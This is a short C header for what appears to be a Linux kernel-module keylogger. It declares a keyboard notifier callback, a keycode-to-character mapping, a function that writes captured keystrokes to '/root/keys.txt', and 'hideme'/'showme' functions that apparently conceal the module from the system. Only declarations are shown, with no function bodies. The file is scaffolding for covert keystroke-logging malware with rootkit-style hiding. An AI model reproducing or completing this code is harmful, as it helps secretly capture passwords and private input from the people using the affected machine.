#include <linux/version.h>
#define BUFF_SIZE 16
#define MAX_SIZE 256
#define FILE_PATH "/root/keys.txt"


extern char queued_chars[MAX_SIZE];
extern struct notifier_block nb;

extern const char *us_keymap[][2];

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

size_t resolve_keycode(int keycode, int is_shift, char *buffer, size_t buffer_size);
ssize_t write_to_file(char *buffer);
int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *nb_ptr);
void hideme(void);
void showme(void);

